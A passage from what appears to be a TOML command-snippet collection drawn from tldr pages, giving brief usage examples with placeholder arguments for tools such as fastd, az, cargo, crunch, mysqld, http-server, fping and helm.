  command = "atoum -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Run a specific [d]irectory of tests"
  command = "atoum -d <path/to/directory>"
  output = ""

[[snippets]]
  description = "Run all tests under a specific name[s]pace"
  command = "atoum -ns <namespace>"
  output = ""

[[snippets]]
  description = "Run all tests with a specific [t]ag"
  command = "atoum -t <tag>"
  output = ""

[[snippets]]
  description = "Load a custom bootstrap file before running tests"
  command = "atoum --bootstrap-file <path/to/file>"
  output = ""

[[snippets]]
  description = "Start `fastd` with a specific configuration file"
  command = "fastd --config <path/to/fastd.conf>"
  output = ""

[[snippets]]
  description = "Start a Layer 3 VPN with an MTU of 1400, loading the rest of the configuration parameters from a file"
  command = "fastd --mode <tap> --mtu <1400> --config <path/to/fastd.conf>"
  output = ""

[[snippets]]
  description = "Validate a configuration file"
  command = "fastd --verify-config --config <path/to/fastd.conf>"
  output = ""

[[snippets]]
  description = "Generate a new key"
  command = "fastd --generate-key"
  output = ""

[[snippets]]
  description = "Show the public key to a private key in a configuration file"
  command = "fastd --show-key --config <path/to/fastd.conf>"
  output = ""

[[snippets]]
  description = "Show the current version"
  command = "fastd -v"
  output = ""

[[snippets]]
  description = "Launch a GitWeb server for the current Git repository"
  command = "git instaweb --start"
  output = ""

[[snippets]]
  description = "Listen only on localhost"
  command = "git instaweb --start --local"
  output = ""

[[snippets]]
  description = "Listen on a specific port"
  command = "git instaweb --start --port <1234>"
  output = ""

[[snippets]]
  description = "Use a specified HTTP daemon"
  command = "git instaweb --start --httpd <lighttpd|apache2|mongoose|plackup|webrick>"
  output = ""

[[snippets]]
  description = "Also auto-launch a web browser"
  command = "git instaweb --start --browser"
  output = ""

[[snippets]]
  description = "Stop the currently running GitWeb server"
  command = "git instaweb --stop"
  output = ""

[[snippets]]
  description = "Restart the currently running GitWeb server"
  command = "git instaweb --restart"
  output = ""

[[snippets]]
  description = "Extract all images from a PDF file and save them as PNGs"
  command = "pdfimages -png <path/to/file.pdf> <filename_prefix>"
  output = ""

[[snippets]]
  description = "Extract images from pages 3 to 5"
  command = "pdfimages -f <3> -l <5> <path/to/file.pdf> <filename_prefix>"
  output = ""

[[snippets]]
  description = "Extract images from a PDF file and include the page number in the output filenames"
  command = "pdfimages -p <path/to/file.pdf> <filename_prefix>"
  output = ""

[[snippets]]
  description = "List information about all the images in a PDF file"
  command = "pdfimages -list <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Display a markdown reference of all `gh` commands"
  command = "gh reference"
  output = ""

[[snippets]]
  description = "Display the latest commit for each row of a table"
  command = "dolt blame <table>"
  output = ""

[[snippets]]
  description = "Display the latest commits for each row of a table when the specified commit was made"
  command = "dolt blame <commit> <table>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "dolt blame --help"
  output = ""

[[snippets]]
  description = "Download missing packages while compiling"
  command = "texliveonfly <source.tex>"
  output = ""

[[snippets]]
  description = "Use a specific compiler (defaults to `pdflatex`)"
  command = "texliveonfly --compiler=<compiler> <source.tex>"
  output = ""

[[snippets]]
  description = "Use a custom TeX Live `bin` folder"
  command = "texliveonfly --texlive_bin=<path/to/texlive_bin> <source.tex>"
  output = ""

[[snippets]]
  description = "Create a read-only subscription level lock"
  command = "az lock create --name <lock_name> --lock-type ReadOnly"
  output = ""

[[snippets]]
  description = "Create a read-only resource group level lock"
  command = "az lock create --name <lock_name> --resource-group <group_name> --lock-type ReadOnly"
  output = ""

[[snippets]]
  description = "Delete a subscription level lock"
  command = "az lock delete --name <lock_name>"
  output = ""

[[snippets]]
  description = "Delete a resource group level lock"
  command = "az lock delete --name <lock_name> --resource-group <group_name>"
  output = ""

[[snippets]]
  description = "List out all locks on the subscription level"
  command = "az lock list"
  output = ""

[[snippets]]
  description = "Show a subscription level lock with a specific [n]ame"
  command = "az lock show -n <lock_name>"
  output = ""

[[snippets]]
  description = "Add a to-do to a specific project with a given context"
  command = "topydo add ""<todo_message> +<project_name> @<context_name>"""
  output = ""

[[snippets]]
  description = "Add a to-do with a due date of tomorrow with a priority of `A`"
  command = "topydo add ""(A) <todo _message> due:<1d>"""
  output = ""

[[snippets]]
  description = "Add a to-do with a due date of Friday"
  command = "topydo add ""<todo_message> due:<fri>"""
  output = ""

[[snippets]]
  description = "Add a non-strict repeating to-do (next due = now + rec)"
  command = "topydo add ""water flowers due:<mon> rec:<1w>"""
  output = ""

[[snippets]]
  description = "Add a strict repeating to-do (next due = current due + rec)"
  command = "topydo add ""<todo_message> due:<2020-01-01> rec:<+1m>"""
  output = ""

[[snippets]]
  description = "Revert the last `topydo` command executed"
  command = "topydo revert"
  output = ""

[[snippets]]
  description = "Print the tldr page for a specific command (hint: this is how you got here!)"
  command = "tldr <command>"
  output = ""

[[snippets]]
  description = "Print the tldr page for a specific subcommand"
  command = "tldr <command> <subcommand>"
  output = ""

[[snippets]]
  description = "Print the tldr page for a command in the given [L]anguage (if available, otherwise fall back to English)"
  command = "tldr --language <language_code> <command>"
  output = ""

[[snippets]]
  description = "Print the tldr page for a command from a specific [p]latform"
  command = "tldr --platform <android|common|freebsd|linux|osx|netbsd|openbsd|sunos|windows> <command>"
  output = ""

[[snippets]]
  description = "[u]pdate the local cache of tldr pages"
  command = "tldr --update"
  output = ""

[[snippets]]
  description = "List all pages for the current platform and `common`"
  command = "tldr --list"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr docker diff"
  output = ""

[[snippets]]
  description = "Only run tests containing a specific string in their names"
  command = "cargo test <testname>"
  output = ""

[[snippets]]
  description = "Set the number of simultaneous running test cases"
  command = "cargo test -- --test-threads <count>"
  output = ""

[[snippets]]
  description = "Test artifacts in release mode, with optimizations"
  command = "cargo test --release"
  output = ""

[[snippets]]
  description = "Test all packages in the workspace"
  command = "cargo test --workspace"
  output = ""

[[snippets]]
  description = "Run tests for a specific package"
  command = "cargo test --package <package>"
  output = ""

[[snippets]]
  description = "Run tests without hiding output from test executions"
  command = "cargo test -- --nocapture"
  output = ""

[[snippets]]
  description = "Convert a PGM image file to the SBIG ST-4 format"
  command = "pgmtost4 <path/to/input_file.pgm> > <path/to/output.st4>"
  output = ""

[[snippets]]
  description = "Capture traffic on all interfaces"
  command = "httpflow -i <any>"
  output = ""

[[snippets]]
  description = "Use a bpf-style capture to filter the results"
  command = "httpflow <host httpbin.org or host baidu.com>"
  output = ""

[[snippets]]
  description = "Use a regular expression to filter requests by URLs"
  command = "httpflow -u '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Read packets from pcap format binary file"
  command = "httpflow -r <out.cap>"
  output = ""

[[snippets]]
  description = "Write the output to a directory"
  command = "httpflow -w <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a managed container registry"
  command = "az acr create --name <registry_name> --resource-group <resource_group> --sku <sku>"
  output = ""

[[snippets]]
  description = "Login to a registry"
  command = "az acr login --name <registry_name>"
  output = ""

[[snippets]]
  description = "Tag a local image for ACR"
  command = "docker tag <image_name> <registry_name>.azurecr.io/<image_name>:<tag>"
  output = ""

[[snippets]]
  description = "Push an image to a registry"
  command = "docker push <registry_name>.azurecr.io/<image_name>:<tag>"
  output = ""

[[snippets]]
  description = "Pull an image from a registry"
  command = "docker pull <registry_name>.azurecr.io/<image_name>:<tag>"
  output = ""

[[snippets]]
  description = "Delete an image from a registry"
  command = "az acr repository delete --name <registry_name> --repository <image_name>:<tag>"
  output = ""

[[snippets]]
  description = "Delete a managed container registry"
  command = "az acr delete --name <registry_name> --resource-group <resource_group> --yes"
  output = ""

[[snippets]]
  description = "List images within a registry"
  command = "az acr repository list --name <registry_name> --output table"
  output = ""

[[snippets]]
  description = "Rebuild the database schema"
  command = "cradle sql build"
  output = ""

[[snippets]]
  description = "Rebuild the database schema for a specific package"
  command = "cradle sql build <package>"
  output = ""

[[snippets]]
  description = "Empty the entire database"
  command = "cradle sql flush"
  output = ""

[[snippets]]
  description = "Empty the database tables for a specific package"
  command = "cradle sql flush <package>"
  output = ""

[[snippets]]
  description = "Populate the tables for all packages"
  command = "cradle sql populate"
  output = ""

[[snippets]]
  description = "Populate the tables for a specific package"
  command = "cradle sql populate <package>"
  output = ""

[[snippets]]
  description = "List all files in a `.zip` file in long format (permissions, ownership, size, and modification date)"
  command = "zipinfo <path/to/archive.zip>"
  output = ""

[[snippets]]
  description = "List all files in a `.zip` file"
  command = "zipinfo -1 <path/to/archive.zip>"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr gemtopnm"
  output = ""

[[snippets]]
  description = "Log in in gist on this computer"
  command = "gist --login"
  output = ""

[[snippets]]
  description = "Create a gist from any number of text files"
  command = "gist <file.txt> <file2.txt>"
  output = ""

[[snippets]]
  description = "Create a private gist with a description"
  command = "gist --private --description ""<A meaningful description>"" <file.txt>"
  output = ""

[[snippets]]
  description = "Read contents from `stdin` and create a gist from it"
  command = "<echo ""hello world""> | gist"
  output = ""

[[snippets]]
  description = "List your public and private gists"
  command = "gist --list"
  output = ""

[[snippets]]
  description = "List all public gists for any user"
  command = "gist --list <username>"
  output = ""

[[snippets]]
  description = "Update a gist using the ID from URL"
  command = "gist --update <GIST_ID> <file.txt>"
  output = ""

[[snippets]]
  description = "Change the owner user of a file/directory"
  command = "chown <user> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Change the owner user and group of a file/directory"
  command = "chown <user>:<group> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Recursively change the owner of a directory and its contents"
  command = "chown -R <user> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Change the owner of a symbolic link"
  command = "chown -h <user> <path/to/symlink>"
  output = ""

[[snippets]]
  description = "Change the owner of a file/directory to match a reference file"
  command = "chown --reference=<path/to/reference_file> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Output a list of words of length 1 to 3 with only lowercase characters"
  command = "crunch <1> <3>"
  output = ""

[[snippets]]
  description = "Output a list of hexadecimal words of length 8"
  command = "crunch <8> <8> <0123456789abcdef>"
  output = ""

[[snippets]]
  description = "Output a list of all permutations of abc (lengths are not processed)"
  command = "crunch <1> <1> -p <abc>"
  output = ""

[[snippets]]
  description = "Output a list of all permutations of the given strings (lengths are not processed)"
  command = "crunch <1> <1> -p <abc> <def> <ghi>"
  output = ""

[[snippets]]
  description = "Output a list of words generated according to the given pattern and a maximum number of duplicate letters"
  command = "crunch <5> <5> <abcde123> -t <@@@12> -d 2@"
  output = ""

[[snippets]]
  description = "Write a list of words in chunk files of a given size, starting with the given string"
  command = "crunch <3> <5> -o <START> -b <10kb> -s <abc>"
  output = ""

[[snippets]]
  description = "Write a list of words stopping with the given string and inverting the wordlist"
  command = "crunch <1> <5> -o <START> -e <abcde> -i"
  output = ""

[[snippets]]
  description = "Write a list of words in compressed chunk files with a specified number of words"
  command = "crunch <1> <5> -o <START> -c <1000> -z <gzip|bzip2|lzma|7z>"
  output = ""

[[snippets]]
  description = "Start the MySQL database server"
  command = "mysqld"
  output = ""

[[snippets]]
  description = "Start the server, printing error messages to the console"
  command = "mysqld --console"
  output = ""

[[snippets]]
  description = "Start the server, saving logging output to a custom log file"
  command = "mysqld --log=<path/to/file.log>"
  output = ""

[[snippets]]
  description = "Print the default arguments and their values and exit"
  command = "mysqld --print-defaults"
  output = ""

[[snippets]]
  description = "Start the server, reading arguments and values from a file"
  command = "mysqld --defaults-file=<path/to/file>"
  output = ""

[[snippets]]
  description = "Start the server and listen on a custom port"
  command = "mysqld --port=<port>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mysqld --verbose --help"
  output = ""

[[snippets]]
  description = "Extract the second column from a CSV file"
  command = "csvtool --column <2> <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Extract the second and fourth columns from a CSV file"
  command = "csvtool --column <2,4> <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Extract lines from a CSV file where the second column exactly matches 'Foo'"
  command = "csvtool --column <2> --search '<^Foo$>' <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Extract lines from a CSV file where the second column starts with 'Bar'"
  command = "csvtool --column <2> --search '<^Bar>' <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Find lines in a CSV file where the second column ends with 'Baz' and then extract the third and sixth columns"
  command = "csvtool --column <2> --search '<Baz$>' <path/to/file.csv> | csvtool --no-header --column <3,6>"
  output = ""

[[snippets]]
  description = "Start an HTTP server listening on the default port to serve the current directory"
  command = "http-server"
  output = ""

[[snippets]]
  description = "Start an HTTP server on a specific port to serve a specific directory"
  command = "http-server <path/to/directory> --port <port>"
  output = ""

[[snippets]]
  description = "Start an HTTP server using basic authentication"
  command = "http-server --username <username> --password <password>"
  output = ""

[[snippets]]
  description = "Start an HTTP server with directory listings disabled"
  command = "http-server -d <false>"
  output = ""

[[snippets]]
  description = "Start an HTTPS server on the default port using the specified certificate"
  command = "http-server --ssl --cert <path/to/cert.pem> --key <path/to/key.pem>"
  output = ""

[[snippets]]
  description = "Start an HTTP server and include the client's IP address in the output logging"
  command = "http-server --log-ip"
  output = ""

[[snippets]]
  description = "Start an HTTP server with CORS enabled by including the `Access-Control-Allow-Origin: *` header in all responses"
  command = "http-server --cors"
  output = ""

[[snippets]]
  description = "Start an HTTP server with logging disabled"
  command = "http-server --silent"
  output = ""

[[snippets]]
  description = "Revert the most recent commit"
  command = "git revert <HEAD>"
  output = ""

[[snippets]]
  description = "Revert the 5th last commit"
  command = "git revert HEAD~<4>"
  output = ""

[[snippets]]
  description = "Revert a specific commit"
  command = "git revert <0c01a9>"
  output = ""

[[snippets]]
  description = "Revert multiple commits"
  command = "git revert <branch_name~5..branch_name~2>"
  output = ""

[[snippets]]
  description = "Don't create new commits, just change the working tree"
  command = "git revert -n <0c01a9..9a1743>"
  output = ""

[[snippets]]
  description = "Scan a docker image"
  command = "osv-scanner -D <docker_image_name>"
  output = ""

[[snippets]]
  description = "Scan a package lockfile"
  command = "osv-scanner -L <path/to/lockfile>"
  output = ""

[[snippets]]
  description = "Scan an SBOM file"
  command = "osv-scanner -S <path/to/sbom_file>"
  output = ""

[[snippets]]
  description = "Scan multiple directories recursively"
  command = "osv-scanner -r <directory1 directory2 ...>"
  output = ""

[[snippets]]
  description = "Skip scanning Git repositories"
  command = "osv-scanner --skip-git <-r|-D> <target>"
  output = ""

[[snippets]]
  description = "Output result in JSON format"
  command = "osv-scanner --json <-D|-L|-S|-r> <target>"
  output = ""

[[snippets]]
  description = "Traceroute to a host and continuously ping all intermediary hops"
  command = "mtr <example.com>"
  output = ""

[[snippets]]
  description = "Disable IP address and host name mapping"
  command = "mtr --no-dns <example.com>"
  output = ""

[[snippets]]
  description = "Generate output after pinging each hop 10 times"
  command = "mtr --report-wide <example.com>"
  output = ""

[[snippets]]
  description = "Force IP IPv4 or IPV6"
  command = "mtr -4 <example.com>"
  output = ""

[[snippets]]
  description = "Wait for a given time (in seconds) before sending another packet to the same hop"
  command = "mtr --interval <10> <example.com>"
  output = ""

[[snippets]]
  description = "Display the Autonomous System Number (ASN) for each hop"
  command = "mtr --aslookup <example.com>"
  output = ""

[[snippets]]
  description = "Display both IP address and reverse DNS name"
  command = "mtr --show-ips <example.com>"
  output = ""

[[snippets]]
  description = "Build a sketch"
  command = "arduino --verify <path/to/file.ino>"
  output = ""

[[snippets]]
  description = "Build and upload a sketch"
  command = "arduino --upload <path/to/file.ino>"
  output = ""

[[snippets]]
  description = "Build and upload a sketch to an Arduino Nano with an Atmega328p CPU, connected on port `/dev/ttyACM0`"
  command = "arduino --board <arduino:avr:nano:cpu=atmega328p> --port </dev/ttyACM0> --upload <path/to/file.ino>"
  output = ""

[[snippets]]
  description = "Set the preference `name` to a given `value`"
  command = "arduino --pref <name>=<value>"
  output = ""

[[snippets]]
  description = "Build a sketch, put the build results in the build directory, and reuse any previous build results in that directory"
  command = "arduino --pref build.path=<path/to/build_directory> --verify <path/to/file.ino>"
  output = ""

[[snippets]]
  description = "Save any (changed) preferences to `preferences.txt`"
  command = "arduino --save-prefs"
  output = ""

[[snippets]]
  description = "Install the latest SAM board"
  command = "arduino --install-boards ""<arduino:sam>"""
  output = ""

[[snippets]]
  description = "Install Bridge and Servo libraries"
  command = "arduino --install-library ""<Bridge:1.0.0,Servo:1.2.0>"""
  output = ""

[[snippets]]
  description = "Display the conan frogarian"
  command = "conan frogarian"
  output = ""

[[snippets]]
  description = "Start imerge-based rebase (checkout the branch to be rebased, first)"
  command = "git imerge rebase <branch_to_rebase_onto>"
  output = ""

[[snippets]]
  description = "Start imerge-based merge (checkout the branch to merge into, first)"
  command = "git imerge merge <branch_to_be_merged>"
  output = ""

[[snippets]]
  description = "Show ASCII diagram of in-progress merge or rebase"
  command = "git imerge diagram"
  output = ""

[[snippets]]
  description = "Continue imerge operation after resolving conflicts (`git add` the conflicted files, first)"
  command = "git imerge continue --no-edit"
  output = ""

[[snippets]]
  description = "Wrap up imerge operation, after all conflicts are resolved"
  command = "git imerge finish"
  output = ""

[[snippets]]
  description = "Abort imerge operation, and return to the previous branch"
  command = "git-imerge remove && git checkout <previous_branch>"
  output = ""

[[snippets]]
  description = "Open the first upstream in the default browser"
  command = "git browse"
  output = ""

[[snippets]]
  description = "Open a specific upstream in the default browser"
  command = "git browse <upstream>"
  output = ""

[[snippets]]
  description = "Show the status of the Prosody server"
  command = "sudo prosodyctl status"
  output = ""

[[snippets]]
  description = "Reload the server's configuration files"
  command = "sudo prosodyctl reload"
  output = ""

[[snippets]]
  description = "Add a user to the Prosody XMPP server"
  command = "sudo prosodyctl adduser <user@example.com>"
  output = ""

[[snippets]]
  description = "Set a user's password"
  command = "sudo prosodyctl passwd <user@example.com>"
  output = ""

[[snippets]]
  description = "Permanently delete a user"
  command = "sudo prosodyctl deluser <user@example.com>"
  output = ""

[[snippets]]
  description = "Display the default inventory"
  command = "ansible-inventory --list"
  output = ""

[[snippets]]
  description = "Display a custom inventory"
  command = "ansible-inventory --list --inventory <path/to/file_or_script_or_directory>"
  output = ""

[[snippets]]
  description = "Display the default inventory in YAML"
  command = "ansible-inventory --list --yaml"
  output = ""

[[snippets]]
  description = "Dump the default inventory to a file"
  command = "ansible-inventory --list --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Check tags for a GPG signature"
  command = "git verify-tag <tag1 optional_tag2 ...>"
  output = ""

[[snippets]]
  description = "Check tags for a GPG signature and show details for each tag"
  command = "git verify-tag <tag1 optional_tag2 ...> --verbose"
  output = ""

[[snippets]]
  description = "Check tags for a GPG signature and print the raw details"
  command = "git verify-tag <tag1 optional_tag2 ...> --raw"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "scheme"
  output = ""

[[snippets]]
  description = "Run a scheme program (with no REPL output)"
  command = "scheme --quiet < <script.scm>"
  output = ""

[[snippets]]
  description = "Load a scheme program into the REPL"
  command = "scheme --load <script.scm>"
  output = ""

[[snippets]]
  description = "Load scheme expressions into the REPL"
  command = "scheme --eval ""<(define foo 'x)>"""
  output = ""

[[snippets]]
  description = "Open the REPL in quiet mode"
  command = "scheme --quiet"
  output = ""

[[snippets]]
  description = "Open the current directory in WebStorm"
  command = "webstorm"
  output = ""

[[snippets]]
  description = "Open a specific directory in WebStorm"
  command = "webstorm <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open specific files in the LightEdit mode﻿"
  command = "webstorm -e <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Open and wait until done editing a specific file in the LightEdit mode"
  command = "webstorm --wait -e <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file with the cursor at the specific line"
  command = "webstorm --line <line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open and compare files (supports up to 3 files)"
  command = "webstorm diff <path/to/file1 path/to/file2 path/to/optional_file3>"
  output = ""

[[snippets]]
  description = "Open and perform a three-way merge"
  command = "webstorm merge <path/to/left_file> <path/to/right_file> <path/to/target_file>"
  output = ""

[[snippets]]
  description = "Remove a dependency from the current project"
  command = "cargo remove <dependency>"
  output = ""

[[snippets]]
  description = "Remove a development or build dependency"
  command = "cargo remove --<dev|build> <dependency>"
  output = ""

[[snippets]]
  description = "Remove a dependency of the given target platform"
  command = "cargo remove --target <target> <dependency>"
  output = ""

[[snippets]]
  description = "Open a file and enter normal mode, to execute commands"
  command = "kak <path/to/file>"
  output = ""

[[snippets]]
  description = "Enter insert mode from normal mode, to write text into the file"
  command = "i"
  output = ""

[[snippets]]
  description = "Escape insert mode, to go back to normal mode"
  command = "<Esc>"
  output = ""

[[snippets]]
  description = "Replace all instances of "foo" in the current file with "bar""
  command = "%s<foo><Enter>c<bar><Esc>"
  output = ""

[[snippets]]
  description = "Unselect all secondary selections, and keep only the main one"
  command = "<Space>"
  output = ""

[[snippets]]
  description = "Search for numbers and select the first two"
  command = "/\d+<Enter>N"
  output = ""

[[snippets]]
  description = "Insert the contents of a file"
  command = "!cat <path/to/file><Enter>"
  output = ""

[[snippets]]
  description = "Save the current file"
  command = ":w<Enter>"
  output = ""

[[snippets]]
  description = "Display version of all packages"
  command = "pyats version check"
  output = ""

[[snippets]]
  description = "Display outdated packages"
  command = "pyats version check --outdated"
  output = ""

[[snippets]]
  description = "Update packages to the most recent version"
  command = "pyats version update"
  output = ""

[[snippets]]
  description = "Update or downgrade packages to a specific version"
  command = "pyats version update <version>"
  output = ""

[[snippets]]
  description = "Run updates"
  command = "topgrade"
  output = ""

[[snippets]]
  description = "Say yes to all updates"
  command = "topgrade -y"
  output = ""

[[snippets]]
  description = "Cleanup temporary/old files"
  command = "topgrade -c"
  output = ""

[[snippets]]
  description = "Disable a certain update operation"
  command = "topgrade --disable <operation>"
  output = ""

[[snippets]]
  description = "Only perform a certain update operation"
  command = "topgrade --only <operation>"
  output = ""

[[snippets]]
  description = "Edit the configuration file with default editor"
  command = "topgrade --edit-config"
  output = ""

[[snippets]]
  description = "Kill all tasks in the default group"
  command = "pueue kill"
  output = ""

[[snippets]]
  description = "Kill a specific task"
  command = "pueue kill <task_id>"
  output = ""

[[snippets]]
  description = "Kill a task and terminate all its child processes"
  command = "pueue kill --children <task_id>"
  output = ""

[[snippets]]
  description = "Kill all tasks in a group and pause the group"
  command = "pueue kill --group <group_name>"
  output = ""

[[snippets]]
  description = "Kill all tasks across all groups and pause all groups"
  command = "pueue kill --all"
  output = ""

[[snippets]]
  description = "List available packages"
  command = "sdkmanager --list"
  output = ""

[[snippets]]
  description = "Install a package"
  command = "sdkmanager <package>"
  output = ""

[[snippets]]
  description = "Update every installed package"
  command = "sdkmanager --update"
  output = ""

[[snippets]]
  description = "Uninstall a package"
  command = "sdkmanager --uninstall <package>"
  output = ""

[[snippets]]
  description = "Initialize a minimal website project in the current working directory"
  command = "soupault --init"
  output = ""

[[snippets]]
  description = "Build a website"
  command = "soupault"
  output = ""

[[snippets]]
  description = "Override default configuration file and directory locations"
  command = "soupault --config <config_path> --site-dir <input_dir> --build-dir <output_dir>"
  output = ""

[[snippets]]
  description = "Extract metadata into a JSON file without generating pages"
  command = "soupault --index-only --dump-index-json <path/to/file.json>"
  output = ""

[[snippets]]
  description = "Show the effective configuration (values from `soupault.toml` plus defaults)"
  command = "soupault --show-effective-config"
  output = ""

[[snippets]]
  description = "Find process lines containing a specific string"
  command = "psgrep <process_name>"
  output = ""

[[snippets]]
  description = "Find process lines containing a specific string, excluding headers"
  command = "psgrep -n <process_name>"
  output = ""

[[snippets]]
  description = "Search using a simplified format (PID, user, command)"
  command = "psgrep -s <process_name>"
  output = ""

[[snippets]]
  description = "Upload a local path to the parent folder with the specified ID"
  command = "gdrive upload -p <id> <path/to/file_or_folder>"
  output = ""

[[snippets]]
  description = "Download file or directory by ID to current directory"
  command = "gdrive download <id>"
  output = ""

[[snippets]]
  description = "Download to a given local path by its ID"
  command = "gdrive download --path <path/to/folder> <id>"
  output = ""

[[snippets]]
  description = "Create a new revision of an ID using a given file or folder"
  command = "gdrive update <id> <path/to/file_or_folder>"
  output = ""

[[snippets]]
  description = "Encode the contents of a file as base64 and write the result to `stdout`"
  command = "base64 <path/to/file>"
  output = ""

[[snippets]]
  description = "Decode the base64 contents of a file and write the result to `stdout`"
  command = "base64 --decode <path/to/file>"
  output = ""

[[snippets]]
  description = "Encode from `stdin`"
  command = "<somecommand> | base64"
  output = ""

[[snippets]]
  description = "Decode from `stdin`"
  command = "<somecommand> | base64 --decode"
  output = ""

[[snippets]]
  description = "Set the default host triple"
  command = "rustup set default-host <host_triple>"
  output = ""

[[snippets]]
  description = "Set the default profile (`minimal` includes only `rustc`, `rust-std` and `cargo`, whereas `default` adds `rust-docs`, `rustfmt` and `clippy`)"
  command = "rustup set profile <minimal|default>"
  output = ""

[[snippets]]
  description = "Set whether `rustup` should update itself when running `rustup update`"
  command = "rustup set auto-self-update <enable|disable|check-only>"
  output = ""

[[snippets]]
  description = "Resume the most recently suspended job and run it in the background"
  command = "bg"
  output = ""

[[snippets]]
  description = "Resume a specific job (use `jobs -l` to get its ID) and run it in the background"
  command = "bg %<job_id>"
  output = ""

[[snippets]]
  description = "List alive hosts within a subnet generated from a netmask"
  command = "fping -a -g 192.168.1.0/24"
  output = ""

[[snippets]]
  description = "List alive hosts within a subnet generated from an IP range"
  command = "fping -a -g 192.168.1.1 192.168.1.254"
  output = ""

[[snippets]]
  description = "List unreachable hosts within a subnet generated from a netmask"
  command = "fping -u -g 192.168.1.0/24"
  output = ""

[[snippets]]
  description = "Accept print jobs to the specified destinations"
  command = "cupsaccept <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Specify a different server"
  command = "cupsaccept -h <server> <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Store Git credentials in a specific file"
  command = "git config credential.helper 'store --file=<path/to/file>'"
  output = ""

[[snippets]]
  description = "List all Podman images"
  command = "podman images"
  output = ""

[[snippets]]
  description = "List all Podman images including intermediates"
  command = "podman images --all"
  output = ""

[[snippets]]
  description = "List the output in quiet mode (only numeric IDs)"
  command = "podman images --quiet"
  output = ""

[[snippets]]
  description = "List all Podman images not used by any container"
  command = "podman images --filter dangling=true"
  output = ""

[[snippets]]
  description = "List images that contain a substring in their name"
  command = "podman images ""<*image|image*>"""
  output = ""

[[snippets]]
  description = "Convert an A2 poster into 4 A4 pages"
  command = "pdfposter --poster-size a2 <input_file.pdf> <output_file.pdf>"
  output = ""

[[snippets]]
  description = "Scale an A4 poster to A3 and then generate 2 A4 pages"
  command = "pdfposter --scale 2 <input_file.pdf> <output_file.pdf>"
  output = ""

[[snippets]]
  description = "Print lines from `stdin` [m/] matching regex1 and case insensitive [/i] regex2"
  command = "perl -n -e 'print if m/<regex1>/ and m/<regex2>/i'"
  output = ""

[[snippets]]
  description = "Say [-E] first match group, using a regexp, ignoring space in regex [/x]"
  command = "perl -n -E 'say $1 if m/<before> (  <group_regex>  ) <after>/x'"
  output = ""

[[snippets]]
  description = "[-i]n-place, with backup, [s/] substitute all occurrence [/g] of regex with replacement"
  command = "perl -i'.bak' -p -e 's/<regex>/<replacement>/g' <path/to/files>"
  output = ""

[[snippets]]
  description = "Use perl's inline documentation, some pages also available via manual pages on Linux"
  command = "perldoc perlrun ; perldoc module ; perldoc -f splice; perldoc -q perlfaq1"
  output = ""

[[snippets]]
  description = "List every item"
  command = "todo.sh ls"
  output = ""

[[snippets]]
  description = "Add an item with project and context tags"
  command = "todo.sh add '<description> +<project> @<context>'"
  output = ""

[[snippets]]
  description = "Mark an item as [do]ne"
  command = "todo.sh do <item_no>"
  output = ""

[[snippets]]
  description = "Remove an item"
  command = "todo.sh rm <item_no>"
  output = ""

[[snippets]]
  description = "Set an item's [pri]ority (A-Z)"
  command = "todo.sh pri <item_no> <priority>"
  output = ""

[[snippets]]
  description = "Replace an item"
  command = "todo.sh replace <item_no> '<new_description>'"
  output = ""

[[snippets]]
  description = "Interactively pick a specific option to print to `stdout`"
  command = "gum choose ""<option_1>"" ""<option_2>"" ""<option_3>"""
  output = ""

[[snippets]]
  description = "Open an interactive prompt for the user to input a string with a specific placeholder"
  command = "gum input --placeholder ""<value>"""
  output = ""

[[snippets]]
  description = "Open an interactive confirmation prompt and exit with either `0` or `1`"
  command = "gum confirm ""<Continue?>"" --default=false --affirmative ""<Yes>"" --negative ""<No>"" <&& echo ""Yes selected"" || echo ""No selected"">"
  output = ""

[[snippets]]
  description = "Show a spinner while a command is taking place with text alongside"
  command = "gum spin --spinner <dot|line|minidot|jump|pulse|points|globe|moon|monkey|meter|hamburger> --title ""<loading...>"" -- <command>"
  output = ""

[[snippets]]
  description = "Format text to include emojis"
  command = "gum format -t <emoji> ""<:smile: :heart: hello>"""
  output = ""

[[snippets]]
  description = "Interactively prompt for multi-line text (CTRL + D to save) and write to `data.txt`"
  command = "gum write > <data.txt>"
  output = ""

[[snippets]]
  description = "Install one or more plugins"
  command = "fisher <plugin1> <plugin2>"
  output = ""

[[snippets]]
  description = "Install a plugin from a GitHub gist"
  command = "fisher <gist_url>"
  output = ""

[[snippets]]
  description = "Edit 'fishfile' manually with your favorite editor and install multiple plugins"
  command = "<editor> ~/.config/fish/fishfile; fisher"
  output = ""

[[snippets]]
  description = "List installed plugins"
  command = "fisher ls"
  output = ""

[[snippets]]
  description = "Update plugins"
  command = "fisher update"
  output = ""

[[snippets]]
  description = "Remove one or more plugins"
  command = "fisher remove <plugin1> <plugin2>"
  output = ""

[[snippets]]
  description = "Install a helm chart"
  command = "helm install <name> <repository_name>/<chart_name>"
  output = ""

[[snippets]]
  description = "Install a helm chart from an unpacked chart directory"
  command = "helm install <name> <path/to/source_directory>"
  output = ""

[[snippets]]
  description = "Install a helm chart from a URL"
  command = "helm install <package_name> <https://example.com/charts/packagename-1.2.3.tgz>"
  output = ""

[[snippets]]
  description = "Install a helm chart and generate a name"
  command = "helm install <repository_name>/<chart_name> --generate-name"
  output = ""

